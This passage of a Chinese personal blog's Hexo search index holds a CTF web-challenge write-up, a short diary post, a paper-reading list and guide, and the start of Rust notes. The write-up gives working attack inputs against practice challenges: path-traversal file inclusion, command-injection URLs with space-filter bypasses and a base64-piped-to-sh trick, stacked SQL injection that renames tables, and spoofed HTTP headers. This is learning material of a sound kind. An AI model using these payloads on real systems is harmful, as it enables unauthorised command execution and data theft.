d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> encrypted </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFWriteUp-练习</title>
      <link href="/2024/04/20/CTFWriteUp-Web%E7%BB%83%E4%B9%A0/"/>
      <url>/2024/04/20/CTFWriteUp-Web%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="XCTF-攻防世界"><a href="#XCTF-攻防世界" class="headerlink" title="XCTF 攻防世界"></a>XCTF 攻防世界</h2><h3 id="1-Training-WWW-Robots"><a href="#1-Training-WWW-Robots" class="headerlink" title="1. Training-WWW-Robots"></a>1. Training-WWW-Robots</h3><blockquote><p> In this little training challenge, you are going to learn about the <a href="http://en.wikipedia.org/wiki/Robots_exclusion_standard">Robots_exclusion_standard</a>.<br>The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.<br>Sometimes these files reveal the directory structure instead protecting the content from being crawled.</p><p>Enjoy!</p></blockquote><p>阅读对应的维基百科，知道 <code>robot.txt</code> 是实现网络爬虫协议的一个组成部分，它存储于服务器的根目录下。</p><p>在该文件中指定哪些文件是不应该被爬取的。</p><p>它是一个约定，并不能做到保护的作用。</p><p>在 URL 后面拼加 <code>robot.txt</code>，得到 <code>http://61.147.171.105:52231/robots.txt</code>。</p><p>看到被保护的内容：</p><p><img src="/images/CTF/robot.png"></p><p>拼接得到 <code>http://61.147.171.105:52231/fl0g.php</code>.</p><p>拿到 flag：<code>cyberpeace&#123;bbbee5d48d26e0c84d4d1e3007a0919a&#125;</code>。</p><h3 id="2-get-post"><a href="#2-get-post" class="headerlink" title="2. get_post"></a>2. get_post</h3><blockquote><p>请用GET方式提交一个名为a,值为1的变量</p><p>请再以POST方式随便提交一个名为b,值为2的变量</p></blockquote><ol><li><a href="http://61.147.171.105:50813/?*a=1*%EF%BC%8C%E6%8B%BC%E6%8E%A5">http://61.147.171.105:50813/?*a=1*，拼接</a> <code>?a=1</code>。好像我只会这个。</li><li>不知道怎么发送 post 请求，网上查了下要用工具。正在下载 burpsuite。</li></ol><h3 id="3-HCTF-2018-WarmUp"><a href="#3-HCTF-2018-WarmUp" class="headerlink" title="3. [HCTF 2018] WarmUp"></a>3. [HCTF 2018] WarmUp</h3><blockquote><p> 代码审计，PHP，任意文件包含漏洞</p><p> 路径穿越</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://abc.example.com/xxx.php?file=yyy.php?../../../x">http://abc.example.com/xxx.php?file=yyy.php?../../../x</a></p><h3 id="4-ACTF2020-新生赛-Include"><a href="#4-ACTF2020-新生赛-Include" class="headerlink" title="4.  [ACTF2020 新生赛] Include"></a>4.  [ACTF2020 新生赛] Include</h3><blockquote><p>文件包含，任意文件读取，PHP 伪装协议</p></blockquote><p>文件包含：读取文件并执行</p><p>但是本题是读取文件源码</p><p><code>php://</code> 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>。</p><ul><li><code>php://filter</code>用于<strong>读取源码</strong></li><li><code>php://input</code>用于<strong>执行php代码</strong>。</li></ul><h3 id="5-ACTF2020-新生赛-Exec"><a href="#5-ACTF2020-新生赛-Exec" class="headerlink" title="5. [ACTF2020 新生赛] Exec"></a>5. [ACTF2020 新生赛] Exec</h3><blockquote><p>RCE</p></blockquote><p>使用 <code>;</code> 分隔不同的命令。</p><h3 id="6-GXYCTF2019-Ping-Ping-Ping"><a href="#6-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="6. [GXYCTF2019] Ping Ping Ping"></a>6. [GXYCTF2019] Ping Ping Ping</h3><blockquote><p>RCE，空格过滤</p></blockquote><p>查看当前目录</p><p>构造 url </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a0af81d0-c121-411a-a4b4-3dce0962c2e2.node5.buuoj.cn:81/?ip=1;ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br><span class="line"></span><br><span class="line">--- 1 ping statistics ---</span><br><span class="line">4 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure><p>查看 <code>index.php</code> 源码</p><p>构造 url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a0af81d0-c121-411a-a4b4-3dce0962c2e2.node5.buuoj.cn:81/?ip=1;xxx=g;cat$IFS$4index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">PING <span class="number">1</span> (<span class="number">0.0</span>.<span class="number">0.1</span>): <span class="number">56</span> data bytes</span><br><span class="line"></span><br><span class="line">--- <span class="number">1</span> ping statistics ---</span><br><span class="line"><span class="number">4</span> packets transmitted, <span class="number">0</span> packets received, <span class="number">100</span>% packet loss</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>想办法绕过限制，访问 flag.php</p><ul><li><p>空格过滤</p></li><li><p>变量替换</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a0af81d0-c121-411a-a4b4-3dce0962c2e2.node5.buuoj.cn:81/?ip=1;xxx=g;cat$IFS$9fla$xxx.php</span><br></pre></td></tr></table></figure><p>额外的题解：</p><p>base64 构造 <code>Y2F0IGZsYWcucGhw</code>，也就是 <code>cat flag.php</code>。</p><p>构造 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a0af81d0-c121-411a-a4b4-3dce0962c2e2.node5.buuoj.cn:81/?ip=1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</span><br></pre></td></tr></table></figure><p>使用 echo 输出 <code>cat flag.php</code> 的 base64 编码绕过检查，然后送给 <code>base64</code> 工具解码后给 <code>sh</code>，因为 <code>bash</code> 被限制了。</p><h2 id="7-SUCTF-2019-EasySQ"><a href="#7-SUCTF-2019-EasySQ" class="headerlink" title="7. [SUCTF 2019] EasySQ"></a>7. [SUCTF 2019] EasySQ</h2><blockquote><p>SQL 注入</p></blockquote><p>需要猜测后端的 SQL 语句长什么样</p><p>解法 1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span>, <span class="number">1</span></span><br></pre></td></tr></table></figure><p>解法 2</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="8-强网杯-2019-随便注"><a href="#8-强网杯-2019-随便注" class="headerlink" title="8. [强网杯 2019] 随便注"></a>8. [强网杯 2019] 随便注</h2><p>常用注入方式：</p><ul><li>基础</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;1 or 1=1 #</span></span><br></pre></td></tr></table></figure><ul><li>测试字段数量</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;1 order by 1 #</span></span><br></pre></td></tr></table></figure><ul><li>union 注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2 #</span></span><br></pre></td></tr></table></figure><ul><li><p>堆叠注入（注入多条 SQL 语句）</p><ul><li><p>爆库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure></li><li><p>爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show tables; #</span></span><br></pre></td></tr></table></figure></li><li><p>检查字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from tb_xxx;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><p>输入 1，回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回复 2，回显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目前这个数据库就两个表 <code>1&#39;; show tables; #</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看 <code>1919810931114514</code> 的字段名字 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from `1919810931114514`; #</span></span><br></pre></td></tr></table></figure><p>看出 flag 就在这个表里</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]<span class="operator">=</span><span class="operator">&gt;</span></span><br><span class="line">  string(<span class="number">4</span>) &quot;flag&quot;</span><br><span class="line">  [<span class="number">1</span>]<span class="operator">=</span><span class="operator">&gt;</span></span><br><span class="line">  string(<span class="number">12</span>) &quot;varchar(100)&quot;</span><br><span class="line">  [<span class="number">2</span>]<span class="operator">=</span><span class="operator">&gt;</span></span><br><span class="line">  string(<span class="number">2</span>) &quot;NO&quot;</span><br><span class="line">  [<span class="number">3</span>]<span class="operator">=</span><span class="operator">&gt;</span></span><br><span class="line">  string(<span class="number">0</span>) &quot;&quot;</span><br><span class="line">  [<span class="number">4</span>]<span class="operator">=</span><span class="operator">&gt;</span></span><br><span class="line">  <span class="keyword">NULL</span></span><br><span class="line">  [<span class="number">5</span>]<span class="operator">=</span><span class="operator">&gt;</span></span><br><span class="line">  string(<span class="number">0</span>) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>猜测平时回显的内容都是从 <code>words</code> 中查出来的，并且每次有 2 个字段。</p><p>因此 SQL 语句类似：<code>select id, data from words where id = ___</code></p><p>解法：</p><p>words 表名随便改一个</p><p>1919810931114514 表名改成 words</p><p>words 中 flag 列名改成 data</p><p>在 words 增加一列 id</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to sb; rename table `1919810931114514` to words;  alter table words add id int unsigned not null auto_increment primary key; alter table words change flag data varchar(100); #</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_44657899/article/details/103239145">https://blog.csdn.net/qq_44657899/article/details/103239145</a></p><h2 id="9-极客大挑战-2019-Secret-File"><a href="#9-极客大挑战-2019-Secret-File" class="headerlink" title="9. [极客大挑战 2019] Secret File"></a>9. [极客大挑战 2019] Secret File</h2><p>查看源码</p><p>burpsuit 抓包，发现还有隐藏的 response</p><p>查看 PHP 源文件</p><p>使用 PHP 伪协议获取源文件（不是执行后的）</p><h2 id="10-极客大挑战-2019-Http"><a href="#10-极客大挑战-2019-Http" class="headerlink" title="10. [极客大挑战 2019] Http"></a>10. [极客大挑战 2019] Http</h2><blockquote><p>HTTP，burpsuite 抓包修改字段</p><p>X-Forwarded-For、User Agent、Referer</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">·小组的愿望：致力于成为国内实力强劲和拥有广泛影响力的安全研究团队，为广大的在校同学营造一个良好的信息安全技术<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;border:none;cursor:default;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;return false&quot;</span> <span class="attr">href</span>=<span class="string">&quot;[Secret.php](http://node5.buuoj.cn:27401/Secret.php)&quot;</span>&gt;</span>氛围<span class="tag">&lt;/<span class="name">a</span>&gt;</span>！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有隐藏站点，按照要求修改 HTTP 头部</p><ul><li><p>Referer: <a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></p></li><li><p>User-Agent: Syclover</p></li><li><p>X-Forwarded-For: 127.0.0.1</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/04/17/hello-world/"/>
      <url>/2024/04/17/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="2024-希望新的交手能很精彩"><a href="#2024-希望新的交手能很精彩" class="headerlink" title="2024 希望新的交手能很精彩"></a>2024 希望新的交手能很精彩</h2><p>渡过了失败的 2023，来到了失败的 2024。</p><p>翻出来了陈年老博客，重新部署了一番，也算扫清屋子再请客。</p><p>按时睡觉，按时吃饭，好好学习，好好健身。</p><p>希望一战上岸。</p><p>感谢 <a href="https://github.com/probberechts/hexo-theme-cactus">hexo-theme-cactus</a> 的无私奉献。</p><p>本博客采用 github page + hexo 搭建。</p><blockquote><p>鱼 <br>于二〇二四正月初四 <br>时晚冬暖阳午悬当空</p></blockquote><hr><p>感谢蛋蛋爱了我一次。<br>于 2024 年 4 月 2 日上午复试通过。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>论文阅读 🚀</title>
      <link href="/2024/02/25/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%F0%9F%9A%80/"/>
      <url>/2024/02/25/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%F0%9F%9A%80/</url>
      
        <content type="html"><![CDATA[<hr><p>这个博客记录一下我读过的一些论文，用于准备考研复试 &#x2F; ra 申请和日常学习。</p><table><thead><tr><th></th><th align="center">题目</th><th align="center">出处</th><th align="center">主题</th><th align="center">发表时间</th><th align="center">开始阅读</th></tr></thead><tbody><tr><td>1</td><td align="center">Software-Defined Network Assimilation: Bridging the Last Mile Towards Centralized Network Configuration Management with NAssim</td><td align="center">SIGCOMM</td><td align="center">Network manageability; Network management; Computing methodologies</td><td align="center">2022</td><td align="center">2024.2.25</td></tr><tr><td>2</td><td align="center">Large Language Model guided Protocol Fuzzing</td><td align="center">NDSS</td><td align="center">LLM; Fuzzing; Networks; Software testing</td><td align="center">2024</td><td align="center">2024.4.12</td></tr><tr><td>3</td><td align="center">Examining Zero-Shot Vulnerability Repair with Large Language Models</td><td align="center">S&amp;P</td><td align="center">LLM; Vulnerability</td><td align="center">2023</td><td align="center">2024.4.13</td></tr><tr><td>4</td><td align="center">How well does LLM generate security tests?</td><td align="center">arxiv</td><td align="center">LLM; Fuzzing; Software testing; Prompt</td><td align="center">2023</td><td align="center">2024.4.13</td></tr><tr><td>5</td><td align="center">Large Language Models for Test-Free Fault Localization</td><td align="center">ICSE</td><td align="center">LLM; Fault Localization</td><td align="center">2024</td><td align="center">2024.4.13</td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h2 id="how-to-read-a-paper"><a href="#how-to-read-a-paper" class="headerlink" title="how to read a paper"></a>how to read a paper</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ol><li><em>废纸</em>，不值得了解</li><li><em>值得了解</em>的论文，快速浏览，知道方法和大致思路，不用深究（大部分论文）</li><li><em>值得精读</em>，有很大启发性和突破性，写作良好，经得住考验</li><li><em>经典论文</em>，搞清楚方法和细节，自己尝试复现</li></ol><h3 id="看结构"><a href="#看结构" class="headerlink" title="看结构"></a>看结构</h3><p>八股文结构：</p><ol><li>Abstract（开头一小段）</li><li>Introduction（1 - 2 页）- 方法、创新点、大致实验效果</li><li>Related works（在最后）</li><li>Conclusions（结尾）</li><li>Approach（具体细节，可能拆分为很多章节）</li><li>Experiments（实验）</li></ol><h3 id="阅读顺序"><a href="#阅读顺序" class="headerlink" title="阅读顺序"></a>阅读顺序</h3><blockquote><p>原则：不要过于纠结某一句话，侧重理解 author 的想法，切忌从头到尾字斟句酌。</p></blockquote><ol><li>读 1 - 2 遍 Abstract<ul><li>I. 处理什么问题</li><li>II. 提出了什么方法和创新点</li><li>III. 方法取得了什么效果</li></ul></li><li>跳过中间部分，直接看论文的实验部分<ul><li>I. 实验环境的搭建（数据集、测试方法、评估指标）</li><li>II. 作者跟什么方法进行比较（本领域景点方法，SOTA (state-of-the-art)）</li><li>III. 取得了何种定性&#x2F;定量的效果（消融实验证明有效性）</li></ul></li></ol><p>针对 [分类 2] 中的论文读到这里就可以结束了，对于 [分类 3&#x2F;4] 可以继续读下去。</p><ol start="3"><li>读 Introduction  - 更详细版的 Abstract</li><li>读 Approach，细节性的推导和算法实现（对于经典论文慢下来反复看这部分，讲给别人听）</li><li>Related Works - 扫一扫，可以跳过</li><li>用审稿人的视角问自己一些问题<ul><li>作者提出了什么方法和创新点</li><li>方法取得了什么效果</li><li>方法具有什么局限性和改进之处</li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> research </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust学习小记</title>
      <link href="/2024/02/23/Rust%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/"/>
      <url>/2024/02/23/Rust%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/rust-cover.jpg"></p><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h5 id="可变性"><a href="#可变性" class="headerlink" title="可变性"></a>可变性</h5><p>rust 中变量默认不可变。</p><p>需要关键字 <code>mut</code> 让变量可变。</p><h5 id="变量绑定"><a href="#变量绑定" class="headerlink" title="变量绑定"></a>变量绑定</h5><p>其实就是其他语言中的 <code>赋值</code>。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br></pre></td></tr></table></figure><h5 id="未使用变量"><a href="#未使用变量" class="headerlink" title="未使用变量"></a>未使用变量</h5><p>rust 中定义了一个变量但是未使用，编译器会给以个 warning。</p><p>但是可以通过如同 Golang 中的 <em>_</em> 来忽略。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> 